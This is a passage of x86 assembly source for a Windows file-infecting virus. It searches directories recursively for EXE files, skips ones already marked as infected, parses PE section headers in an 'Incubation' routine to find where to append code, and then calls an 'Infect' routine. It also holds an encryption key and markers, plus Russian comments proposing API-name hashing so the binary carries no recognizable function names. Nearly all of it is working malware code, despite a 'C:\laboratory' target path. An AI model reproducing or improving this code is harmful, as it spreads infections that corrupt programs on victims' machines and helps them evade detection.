	mov byte ptr [eax+ecx], 0

	lea ecx, w32fd

	push eax;memory pointer in stack

	push ecx; pointer to w32fd
	push eax; search shema
	call [edi+offset _FindFirstFileA] ;HANDLE FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData)

	mov ecx,eax ;TODO Why just oush eax
	push ecx
	call [edi+offset _GetLastError]
	pop ecx

	mov edx,eax
	;TODO Why here so many pushes, is it really necessary?
	push ecx;search handle
	push edx;err_code

	mov eax,dword ptr [esp+8]
	push eax
	call [edi+offset _LocalFree]

	pop edx; error number
	pop ecx;search handle
	pop eax
	push ecx;CloseHandle argument
	cmp edx, ERROR_FILE_NOT_FOUND
	jz file_not_found_label

	loop4:
	call StrLen ;Get filepath folder part length
	push eax
	push esi
	lea esi, w32fd.cFileName
	call StrLen ;Get filepath filename part length
	pop esi
	mov ebx,eax
	pop eax
	add eax,ebx
	add eax,2; now exe path length in eax. 2 '\\'+'\0'
	push eax
	push LPTR
	call [edi+offset _LocalAlloc]

	mov edx,0

	loop2:;copying path 
	cmp byte ptr [esi+edx],0
	jz end_loop2
	mov bl, byte ptr [esi+edx]
	mov byte ptr [eax+edx], bl
	inc edx
	jmp loop2 
	end_loop2:

	mov byte ptr [eax+edx], '\'

	push eax
	push esi

	add eax, edx
	inc eax
	mov edx,0
	lea esi, w32fd.cFileName
	loop3:;copying filename 
	cmp byte ptr [esi+edx],0
	jz end_loop3
	mov bl, byte ptr [esi+edx]
	mov byte ptr [eax+edx], bl
	inc edx
	jmp loop3 
	end_loop3:
	mov byte ptr [eax+edx],0;now in eax path of exe
	mov esi,dword ptr [esp+4]

	;Check if target already infected
	call IsInfected
	cmp eax,1 ;TODO - test eax,1?
	jz go_on

	mov eax,dword ptr [edi+offset victim_count]
	push eax;victim_count in stack
	mov eax,dword ptr [edi+offset victim]
	mov dword ptr [edi+offset victim_count],eax
	;Perform incubation
	call Incubation
	cmp eax,-1
	jz not_infectable_exe
	;Infect victim
	;int 3h; TODO DEBUG
	call Infect
	not_infectable_exe: ;TODO If victim is not infectable , victim count decremented all the same. Its not correct
	pop eax
	dec eax
	mov dword ptr [edi+offset victim_count],eax
	cmp eax,0
	jnz go_on
	mov eax,dword ptr [edi+offset victim] ;TODO Why restore variable values? They are only in memory
	mov dword ptr [edi+offset victim_count],eax
	pop eax
	pop eax
	jmp exit
	
	;need to stack
	;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	go_on:
	pop esi
	pop eax

	pop ecx
	push ecx
	lea eax, w32fd
	push eax
	push ecx
	call [edi+offset _FindNextFileA]
	cmp eax, TRUE
	jz loop4

	file_not_found_label:
	call [edi+offset _CloseHandle]
	;###############-now directory search-######################
	call StrLen
	add eax,3
	push eax
	push LPTR
	call [edi+offset _LocalAlloc]

	mov ecx,0
	loop5:;copying path 
	cmp byte ptr [esi+ecx],0
	jz end_loop5
	mov bl, byte ptr [esi+ecx]
	mov byte ptr [eax+ecx], bl
	inc ecx
	jmp loop5 
	end_loop5:
	mov word ptr [eax+ecx],'*\'
	inc ecx
	inc ecx
	mov byte ptr [eax+ecx],0;now in eax address of directory shema
	lea ecx, w32fd

	push eax;mem ptr

	push ecx
	push eax
	call [edi+offset _FindFirstFileA]

	mov ecx,eax
	push ecx
	call [edi+offset _GetLastError]
	pop ecx

	mov edx,eax
	push ecx
	push edx
	mov eax,dword ptr [esp+8]
	push eax
	call [edi+offset _LocalFree]
	pop edx;error number
	pop ecx;handle in ecx
	pop eax
	push ecx;CloseHandle
	cmp edx, ERROR_FILE_NOT_FOUND
	jz exit

	loop6:
	mov eax,w32fd.dwFileAttributes
	and eax, FILE_ATTRIBUTE_DIRECTORY
	cmp eax, 0
	jz not_dir
	lea eax, w32fd.cFileName

	cmp byte ptr [eax],'.'
	jz temp_not_dir
	jmp is_dir
	temp_not_dir:
	inc eax
	cmp byte ptr [eax],0
	jz not_dir
	cmp byte ptr [eax],'.'
	jz temp_not_dir1
	jmp is_dir
	temp_not_dir1:
	inc eax
	cmp byte ptr [eax],0
	jz not_dir

	is_dir:
	call StrLen
	push eax
	push esi
	lea esi, w32fd.cFileName
	call StrLen
	mov ebx, esi
	pop esi
	pop eax
	add eax,ebx
	add eax,2;dir name length 
	push eax
	push LPTR
	call [edi+offset _LocalAlloc]

	mov ecx,0
	loop7:;copying path 
	cmp byte ptr [esi+ecx],0
	jz end_loop7
	mov bl, byte ptr [esi+ecx]
	mov byte ptr [eax+ecx], bl
	inc ecx
	jmp loop7 
	end_loop7:
	mov byte ptr [eax+ecx], '\'

	push esi
	lea esi, w32fd.cFileName
	push eax
	add eax,ecx
	inc eax
	mov ecx,0
	loop8:;now copy dir name
	cmp byte ptr [esi+ecx],0
	jz end_loop8
	mov bl, byte ptr [esi+ecx]
	mov byte ptr [eax+ecx], bl
	inc ecx
	jmp loop8 
	end_loop8:
	mov byte ptr [eax+ecx], 0
	pop eax;now in eax  dir address and name
	mov esi, eax
	call SearchEXE 
	pop esi
	push eax
	call [edi+offset _LocalFree]
	not_dir:
	lea eax,w32fd
	pop ecx
	push ecx
	push eax
	push ecx
	call [edi+offset _FindNextFileA]
	cmp eax, TRUE
	jz loop6

	exit:
	call [edi+offset _CloseHandle]
	popfd
	popad
	ret
SearchEXE endp

;------------------------------------------------------------------------------------
;in: 
;	esi: path to exe
;out:
;	eax:number of last section in section table ;-1 - exe isnlt infectable
;------------------------------------------------------------------------------------
Incubation proc
	pushfd
	push ebx
	push ecx
	push edx

	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	mov eax, FILE_SHARE_READ
	or eax,FILE_SHARE_WRITE
	push eax
	mov eax, GENERIC_READ
	or eax, GENERIC_WRITE
	push eax
	push esi
	call [edi+ offset _CreateFileA]

	cmp eax, INVALID_HANDLE_VALUE
	jnz file_opened
	mov eax,-1
	jmp exit
	file_opened:
	
	push eax;file handle in stack
	
	mov eax,8
	push eax
	push LPTR
	call [edi+offset _LocalAlloc];need to call LocalFree

	push eax;memory pointer in stack 
	
	mov eax,dword ptr [esp+4]
	push FILE_BEGIN
	push NULL
	push 3Ch
	push eax
	call [edi+ offset _SetFilePointer];file pointer on e_lfanew
	
	mov eax,dword ptr [esp]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+14h]
	push eax
	call [edi+ offset _ReadFile];now offset of PE signature in memory
	
	mov eax, dword ptr [esp]
	mov ebx, dword ptr [eax];offset of PE signature in ebx
	
	push ebx;offset of PE signature in stack
	
	add ebx,6;offset of NumberOfSections field in ebx
	
	mov eax,dword ptr [esp+8]
	push FILE_BEGIN
	push NULL
	push ebx
	push eax
	call [edi+ offset _SetFilePointer];file pointer on NumberOfSections
	
	mov eax,dword ptr [esp+4]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 2
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ offset _ReadFile];NumberOfSections in memory
	
	mov ebx,dword ptr [esp]
	add ebx,14h; SizeOfOptionalHeader
	mov eax,dword ptr [esp+8]
	push FILE_BEGIN
	push NULL
	push ebx
	push eax
	call [edi+ offset _SetFilePointer];file pointer on SizeOfOptionalHeader
	
	mov eax,dword ptr [esp+4]
	push NULL
	add eax,4
	push eax
	sub eax,2
	push 2
	push eax
	mov eax,dword ptr [esp+18h]
	push eax
	call [edi+ offset _ReadFile];SizeOfOptionalHeader in memory
	
	
	
	mov eax,dword ptr [esp+4]
	xor ecx,ecx
	mov cx,word ptr [eax];now in ecx NumberOfSections
	xor ebx,ebx
	mov bx,word ptr [eax+2];now in ebx SizeOfOptionalHeader
	
	pop eax;PE signature offset 
	add eax,ebx;+PE optional header
	add eax,18h;offset of 1st section field in eax
	
	push eax;offset of 1st section field in stack
	
	add eax, 14h;PointerToRawData
	
	push ecx; NumberOfSections in stack

	;loop_label1:
	;	cmp ecx,0
	;	jz end_loop_label1
	;	add eax,28h
	;	dec ecx
	;	jmp loop_label1
	;end_loop_label1:
	;now in eax offset of last section
	;	sub eax,28h;offset of last section in eax

	mov ebx,0
	mov edx,-1
	loop_label1:
	cmp ecx,0
	jz end_loop_label1
	
	
	push eax;current file pointer
	push ecx; counter
	push ebx;max PointerToRawData
	push edx; number of section with max PointerToRawData
	
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+28h]
	push eax
	call [edi+ offset _SetFilePointer];file pointer on PointerToRawData
	
	
	mov eax,dword ptr [esp+18h];memory ptr
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+2Ch]
	push eax
	call [edi+ offset _ReadFile];reading PointerToRawData
	
	mov eax,dword ptr [esp+18h];memory ptr
	mov ebx,dword ptr [eax];PointerToRawData
	mov eax,dword ptr [esp+4];max PointerToRawData
	cmp eax,ebx
	jg rawptr_nl
	
	mov dword ptr [esp+4],ebx;new max PointerToRawData
	
	mov eax,dword ptr [esp+10h];NumberOfSections
	mov ebx,dword ptr [esp+8];counter
	sub eax,ebx
	mov dword ptr [esp],eax;new number of section with max PointerToRawData
	rawptr_nl:
	pop edx
	pop ebx
	pop ecx
	dec ecx
	pop eax
	add eax,28h
	jmp loop_label1
	end_loop_label1:
		;now in ebx - max PointerToRawData; in edx - number of section with max PointerToRawData(last section in file)

	mov eax,dword ptr [esp+4];offset of 1st section field in stack
	mov ecx,edx
	loop_label3:
	cmp ecx,0
	jz end_loop_label3
	add eax,28h
	dec ecx
	jmp loop_label3
	end_loop_label3:
	;now in eax offset of last section in file field

	push edx;number of section with max PointerToRawData(last section in file) in stack
	
	add eax,0Ch;VirtualAddress
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+1Ch]
	push eax
	call [edi+ offset _SetFilePointer];file ptr on VirtualAddress of field of last section in file
	
	
	mov eax, dword ptr[esp+0Ch]
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+20h]
	push eax
	call [edi+ offset _ReadFile];reading VirtualAddress of field of last section in file
	
	mov eax, dword ptr[esp+0Ch];memory ptr
	mov ebx,dword ptr [eax];VirtualAddress of field of last section in file
	
	push ebx;VirtualAddress of field of last section in file in stack
	
	mov eax,dword ptr [esp+0Ch];offset of 1st section field 
	add eax, 0Ch;VirtualAddress
	mov ecx, dword ptr [esp+8h];NumberOfSections
	loop_label2:
	cmp ecx,0
	jz end_loop_label2
	
	push eax
	push ecx
	
	push FILE_BEGIN
	push NULL
	push eax
	mov eax,dword ptr [esp+28h]
	push eax
	call [edi+ offset _SetFilePointer];next section field
	
	mov eax, dword ptr [esp+18h];memory ptr
	push NULL
	add eax,4
	push eax
	sub eax,4
	push 4
	push eax
	mov eax,dword ptr [esp+2Ch]
	push eax
	call [edi+ offset _ReadFile]
	
	mov eax, dword ptr [esp+18h];memory ptr
	mov ecx, dword ptr [eax]
	mov eax, dword ptr [esp+8];VirtualAddress of field of last section in file 
	cmp ecx,eax
	jng last_mem
	
	mov eax,-1
	mov dword ptr [esp+0Ch],eax;writing -1 in last section number
	add esp,8
	jmp end_loop_label2
	
	last_mem:
    pop ecx
	dec ecx
	pop eax
	add eax,28h
	jmp loop_label2	
	end_loop_label2:
	
	mov eax, dword ptr [esp+14h];file handle
	push eax
	call [edi+ offset _CloseHandle]
	
	mov eax, dword ptr [esp+10h];mem ptr
	push eax
	call [edi+ offset _LocalFree]
	
	mov eax,dword ptr [esp+4];number of last section in section table
	add esp,18h
	
	exit:
	pop edx
	pop ecx
	pop ebx
	popfd
	ret
Incubation endp

some_var dd 0
_GetProcAddress dd 0
_CreateFileA dd 0
_ReadFile dd 0
_SetFilePointer dd 0
_WriteFile dd 0
_CloseHandle dd 0
_LocalAlloc dd 0
_LocalFree dd 0
_FindFirstFileA dd 0
_FindNextFileA dd 0
_GetLastError dd 0

GetProcAddress_ db 'GetProcAddress',0;15
CreateFileA_ db 'CreateFileA',0;12
ReadFile_ db 'ReadFile',0;9
SetFilePointer_ db 'SetFilePointer',0;15
WriteFile_ db 'WriteFile',0;10
CloseHandle_ db 'CloseHandle',0;12
LocalAlloc_ db 'LocalAlloc',0;11
LocalFree_ db 'LocalFree',0;10
FindFirstFileA_ db 'FindFirstFileA',0;15
FindNextFileA_ db 'FindNextFileA',0;14
GetLastError_ db 'GetLastError',0;13
;можно хранить не сами названия, а хеш-коды от названий
;например GetProcAddress dd 3FE589ADh
;вместо     GetProcAddress db 'GetProcAddress',0
;чтобы в бинарном виде не было никаких явных названий типа CreateFileA даже если находится в расшифрованном виде
;можно сделать все с 1 меткой:
;FuncHash:
;dd 12345678
;dd 87654321
;dd 3EDF5681
;dd 1A2D4F5C
;dd 0
;маркер окончания - dd 0
;как только находим такой же хеш в таблице экспорта - запоминаем адрес в нашем массиве адресов функций с таким же индексом
;все это делать придется вручную, а не через GetProcAddress, т.к. имен не будет



victim dd 1
victim_count dd 1
entry_point dd 1000h
my_entry_point dd 1000h
rva_code dd 1000h
path db 'C:\laboratory',0



ending_crypto:
cryptmarker_end BYTE 0DEh,0ADh,0BEh,0EFh,0FEh,0EDh,0FAh,0CEh

key dd 0EFBEADDEh

ending:
push 0
call ExitProcess
end LABEL_START